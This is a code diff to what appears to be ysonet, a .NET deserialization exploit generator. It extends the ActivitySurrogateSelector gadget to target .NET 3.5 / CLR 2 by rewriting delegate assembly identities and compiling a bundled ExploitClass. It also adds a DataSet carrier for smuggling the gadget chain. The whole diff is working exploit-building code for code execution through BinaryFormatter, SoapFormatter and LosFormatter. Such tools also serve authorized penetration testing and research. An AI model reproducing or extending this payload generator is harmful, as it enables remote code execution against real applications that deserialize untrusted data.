@@ -14,9 +14,30 @@ namespace ysonet.Generators
 {
     public class MySurrogateSelector : SurrogateSelector
     {
+        private const string LegacySystemCoreIdentity =
+            "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
+
+        private readonly bool targetClr2;
+
+        public MySurrogateSelector(bool targetClr2 = false)
+        {
+            this.targetClr2 = targetClr2;
+        }
+
         public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)
         {
             selector = this;
+            // ysonet runs on CLR 4, where Func<> lives in mscorlib. On CLR 2 the same
+            // delegate lives in System.Core 3.5. The ordinary --legacyfx transform changes
+            // assembly VERSIONS only, so it cannot express this one assembly relocation.
+            // Author the DelegateSerializationHolder entry correctly while the inner stream
+            // is being built. Everything else remains the real delegate graph produced by
+            // the runtime.
+            if (targetClr2 && typeof(Delegate).IsAssignableFrom(type)
+                && type.FullName != null
+                && type.FullName.StartsWith("System.Func`", StringComparison.Ordinal))
+                return LegacyFuncDelegateSurrogate.Instance;
+
             if (!type.IsSerializable)
             {
                 Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
@@ -24,6 +45,68 @@ namespace ysonet.Generators
             }
 
             return base.GetSurrogate(type, context, out selector);
+        }
+
+        /// <summary>
+        /// Delegate.GetObjectData already writes the complete, readable holder graph. This
+        /// surrogate changes only the holder entry's root delegate assembly from CLR 4's
+        /// mscorlib to CLR 2's System.Core. The target never sees this surrogate type: the
+        /// SerializationInfo names System.DelegateSerializationHolder exactly as the normal
+        /// delegate serializer does.
+        /// </summary>
+        private sealed class LegacyFuncDelegateSurrogate : ISerializationSurrogate
+        {
+            internal static readonly LegacyFuncDelegateSurrogate Instance =
+                new LegacyFuncDelegateSurrogate();
+
+            private LegacyFuncDelegateSurrogate()
+            {
+            }
+
+            public void GetObjectData(object obj, SerializationInfo info, StreamingContext context)
+            {
+                ISerializable serializable = obj as ISerializable;
+                if (serializable == null)
+                    throw new SerializationException("The CLR-v2 ActivitySurrogate delegate is not ISerializable.");
+
+                serializable.GetObjectData(info, context);
+
+                object entry = info.GetValue("Delegate", typeof(object));
+                int changed = 0;
+                while (entry != null)
+                {
+                    Type entryType = entry.GetType();
+                    FieldInfo typeField = entryType.GetField("type",
+                        BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
+                    FieldInfo assemblyField = entryType.GetField("assembly",
+                        BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
+                    FieldInfo nextField = entryType.GetField("delegateEntry",
+                        BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
+                    if (typeField == null || assemblyField == null || nextField == null)
+                        throw new SerializationException(
+                            "The runtime DelegateEntry shape is not the one ActivitySurrogateSelector expects.");
+
+                    string delegateType = typeField.GetValue(entry) as string;
+                    if (delegateType != null
+                        && delegateType.StartsWith("System.Func`", StringComparison.Ordinal))
+                    {
+                        assemblyField.SetValue(entry, LegacySystemCoreIdentity);
+                        changed++;
+                    }
+                    entry = nextField.GetValue(entry);
+                }
+
+                if (changed == 0)
+                    throw new SerializationException(
+                        "The CLR-v2 ActivitySurrogate delegate holder contained no Func entry.");
+            }
+
+            public object SetObjectData(object obj, SerializationInfo info,
+                StreamingContext context, ISurrogateSelector selector)
+            {
+                throw new NotSupportedException(
+                    "The generation-only CLR-v2 delegate surrogate is never used to deserialize.");
+            }
         }
 
     }
@@ -39,7 +122,19 @@ namespace ysonet.Generators
         {
             this.variant_number = variant_number;
             this.inputArgs = inputArgs;
-            this.assemblyBytes = File.ReadAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "e.dll"));
+            string binDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+            if (inputArgs != null && inputArgs.LegacyFx)
+            {
+                // E.dll is a 4.7.2 build and CLR 2 refuses it before its constructor can run.
+                // The same readable ExploitClass.cs is copied beside ysonet.exe, so compile
+                // that source with the v3.5 compiler when the payload targets CLR 2.
+                this.assemblyBytes = LocalCodeCompiler.GetAsmBytes(
+                    Path.Combine(binDirectory, "ExploitClass.cs") + ";System.dll", true);
+            }
+            else
+            {
+                this.assemblyBytes = File.ReadAllBytes(Path.Combine(binDirectory, "e.dll"));
+            }
         }
         private IEnumerable<TResult> CreateWhereSelectEnumerableIterator<TSource, TResult>(IEnumerable<TSource> src, Func<TSource, bool> predicate, Func<TSource, TResult> selector)
         {
@@ -194,55 +289,85 @@ namespace ysonet.Generators
         {
             List<object> ls = GadgetChains();
 
-            // Wrap the object inside a DataSet. This is so we can use the custom
-            // surrogate selector. Idiocy added and removed here.
-            /*
-            info.SetType(typeof(System.Data.DataSet));
-            info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
-            info.AddValue("DataSet.DataSetName", "");
-            info.AddValue("DataSet.Namespace", "");
-            info.AddValue("DataSet.Prefix", "");
-            info.AddValue("DataSet.CaseSensitive", false);
-            info.AddValue("DataSet.LocaleLCID", 0x409);
-            info.AddValue("DataSet.EnforceConstraints", false);
-            info.AddValue("DataSet.ExtendedProperties", (PropertyCollection)null);
-            info.AddValue("DataSet.Tables.Count", 1);
-            BinaryFormatter fmt = new BinaryFormatter();
-            MemoryStream stm = new MemoryStream();
-            fmt.SurrogateSelector = new MySurrogateSelector();
-            fmt.Serialize(stm, ls);
-            info.AddValue("DataSet.Tables_0", stm.ToArray());
-            //*/
-
-            //* saving around  404 characters by using AxHost.State instead of DataSet
-            // However, DataSet can apply to more applications
-            // https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.axhost.state
-            // vs
-            // https://docs.microsoft.com/en-us/dotnet/api/system.data.dataset
+            // The ROOT CARRIER that receives these bytes is chosen in GetObjectData below:
+            // AxHost.State (variants 1 and 2, the shorter payload) or DataSet (variant 3).
+            // Both carry the identical chain, so this method does not need to know which.
             MemoryStream stm = new MemoryStream();
 
             if (inputArgs.Minify)
             {
                 ysonet.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal = new ysonet.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();
-                fmtLocal.SurrogateSelector = new MySurrogateSelector();
+                fmtLocal.SurrogateSelector = new MySurrogateSelector(
+                    inputArgs != null && inputArgs.LegacyFx);
                 fmtLocal.Serialize(stm, ls);
             }
             else
             {
                 System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
-                fmt.SurrogateSelector = new MySurrogateSelector();
+                fmt.SurrogateSelector = new MySurrogateSelector(
+                    inputArgs != null && inputArgs.LegacyFx);
                 fmt.Serialize(stm, ls);
             }
 
-            return stm.ToArray();
+            // This whole chain is embedded in the outer document as an OPAQUE byte[]
+            // (AxHost.State's PropertyBagBinary below), so the shared generation boundary
+            // never sees it: the outer walker reads a byte array and steps over it. Every
+            // type in the real gadget chain lives in HERE, so without this call --legacyfx
+            // rewrote one identity in the outer layer and left forty 4.0.0.0 names in the
+            // payload that actually runs - which looks like a working rewrite right up until
+            // the target refuses to bind mscorlib 4.0.0.0 and AxHost.State swallows it.
+            //
+            // The layer is a BinaryFormatter stream, so it is rewritten AS one, by the same
+            // helper the boundary uses. The mechanics stay in the helper; only the decision
+            // to rewrite this layer belongs to this gadget, because only this gadget knows it
+            // embedded one.
+            byte[] inner = stm.ToArray();
+            LegacyFrameworkIdentities.RewriteReport innerReport;
+            inner = (byte[])LegacyFrameworkIdentities.Apply(inner, Formatters.BinaryFormatter,
+                inputArgs, out innerReport);
+            return inner;
         }
 
+        /// <summary>
+        /// Choose the ROOT CARRIER that smuggles the chain.
+        ///
+        /// AxHost.State (variants 1 and 2) is the shorter document - it saves around 404
+        /// characters over DataSet - and it is what this project shipped for years. It does
+        /// unpack this gadget's inner stream on CLR v2; the apparent historical no-fire was its
+        /// swallowing of the inner Func&lt;&gt; assembly-bind failure.
+        ///
+        /// DataSet (variant 3) is the carrier ysoserial.net's .NET 3.5 build used, and a DataSet
+        /// with RemotingFormat=Binary also unpacks DataSet.Tables_0 on CLR v2. It remains an
+        /// explicit, larger alternative for compatibility with that historical shape.
+        ///
+        /// The member NAMES and their ORDER below are the shape DataSet's own serialization
+        /// constructor reads. Tables.Count must precede Tables_0, and the LCID is the invariant
+        /// 0x409 the original used; changing either silently produces a DataSet that builds and
+        /// carries nothing.
+        /// </summary>
         public void GetObjectData(SerializationInfo info, StreamingContext context)
         {
             System.Diagnostics.Trace.WriteLine("In GetObjectData");
+            byte[] chain = GadgetChainsToBinaryFormatter();
+
+            if (this.variant_number == 3)
+            {
+                info.SetType(typeof(System.Data.DataSet));
+                info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
+                info.AddValue("DataSet.DataSetName", "");
+                info.AddValue("DataSet.Namespace", "");
+                info.AddValue("DataSet.Prefix", "");
+                info.AddValue("DataSet.CaseSensitive", false);
+                info.AddValue("DataSet.LocaleLCID", 0x409);
+                info.AddValue("DataSet.EnforceConstraints", false);
+                info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection)null);
+                info.AddValue("DataSet.Tables.Count", 1);
+                info.AddValue("DataSet.Tables_0", chain);
+                return;
+            }
+
             info.SetType(typeof(System.Windows.Forms.AxHost.State));
-            info.AddValue("PropertyBagBinary", GadgetChainsToBinaryFormatter());
-            //*/
+            info.AddValue("PropertyBagBinary", chain);
         }
     }
 
@@ -258,8 +383,9 @@ namespace ysonet.Generators
             return new GadgetFacetSet()
                 .WithKinds(PayloadKind.CodeExecution)
                 .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
-                // System.Workflow chain; its FromFile subclass fired on 4.8.1
-                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
+                // The source-file subclass executes a measured sample on CLR 2 / .NET 3.5
+                // when --legacyfx authors its CLR-v2-only identities.
+                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx35, RuntimeVersion.NetFx481));
         }
 
         private int variant_number = 1;
@@ -268,13 +394,13 @@ namespace ysonet.Generators
         {
             OptionSet options = new OptionSet()
             {
-                {"var|variant=", "Payload variant number where applicable. Choices: 1 (default), 2 (shorter but may not work between versions)", v => int.TryParse(v, out this.variant_number) },
+                {"var|variant=", "Payload variant number where applicable. Choices: 1 (default), 2 (shorter but may not work between versions), 3 (larger DataSet carrier)", v => int.TryParse(v, out this.variant_number) },
             };
             return options;
         }
         public override string AdditionalInfo()
         {
-            return "This gadget ignores the command parameter and executes the constructor of ExploitClass class";
+            return "This gadget ignores the command parameter and executes the constructor of the bundled ExploitClass class. For a .NET Framework 3.5 target, use --legacyfx with the default variant or variant 3; ysonet compiles the bundled ExploitClass.cs with the CLR-v2 compiler and writes Func delegates against System.Core 3.5. Variant 2 remains 4.x-only; variant 3 selects the larger DataSet carrier.";
         }
 
         public override CommandInputType CommandInput()
@@ -287,13 +413,24 @@ namespace ysonet.Generators
             return new List<GadgetVariant>
             {
                 new GadgetVariant(1, "new enumerator chain (version-compatible, default)"),
+                // The older chain still deserializes without an effect on .NET 3.5, so it
+                // retains the project's measured 4.x range while variants 1 and 3 inherit
+                // the lowered 3.5 floor.
                 new GadgetVariant(2, "old chain (shorter, may not work across versions)")
+                    .WithFacets(new GadgetFacetSet()
+                        .WithKinds(PayloadKind.CodeExecution)
+                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
+                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481))),
+                // Variant 3 is variant 1's chain in the DataSet root carrier instead of
+                // AxHost.State. This is the shape ysoserial.net's 3.5 build used and remains
+                // available as an explicit compatibility alternative.
+                new GadgetVariant(3, "DataSet root carrier (larger compatibility alternative)")
             };
         }
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter (2)", "SoapFormatter", "LosFormatter" };
+            return new List<string> { "BinaryFormatter (3)", "SoapFormatter (3)", "LosFormatter (3)" };
         }
 
         public override string Finders()
@@ -319,39 +456,19 @@ namespace ysonet.Generators
             PayloadClass payload = new PayloadClass(variant_number, inputArgs);
             if (inputArgs.Minify)
             {
+                // This branch builds the minified stream itself, so it goes through the shared
+                // finisher with alreadyMinified: that is where the whole-payload generation
+                // boundary runs (--legacyfx today) and where the self-test reads the FINAL
+                // bytes. Returning here directly used to skip both.
                 byte[] payloadInByte = payload.GadgetChainsToBinaryFormatter();
                 if (formatter.ToLower().Equals("binaryformatter"))
                 {
-                    if (inputArgs.Test)
-                    {
-                        try
-                        {
-                            SerializersHelper.BinaryFormatter_deserialize(payloadInByte);
-                        }
-                        catch (Exception err)
-                        {
-                            Debugging.ShowErrors(inputArgs, err);
-                        }
-                    }
-
-                    return payloadInByte;
+                    return FinishHandWrittenPayload(payloadInByte, formatter, inputArgs, null, true);
                 }
                 else if (formatter.ToLower().Equals("losformatter"))
                 {
                     payloadInByte = Helpers.ModifiedVulnerableBinaryFormatters.SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(payload.GadgetChainsToBinaryFormatter());
-
-                    if (inputArgs.Test)
-                    {
-                        try
-                        {
-                            SerializersHelper.LosFormatter_deserialize(payloadInByte);
-                        }
-                        catch (Exception err)
-                        {
-                            Debugging.ShowErrors(inputArgs, err);
-                        }
-                    }
-                    return payloadInByte;
+                    return FinishHandWrittenPayload(payloadInByte, formatter, inputArgs, null, true);
                 }
             }
 
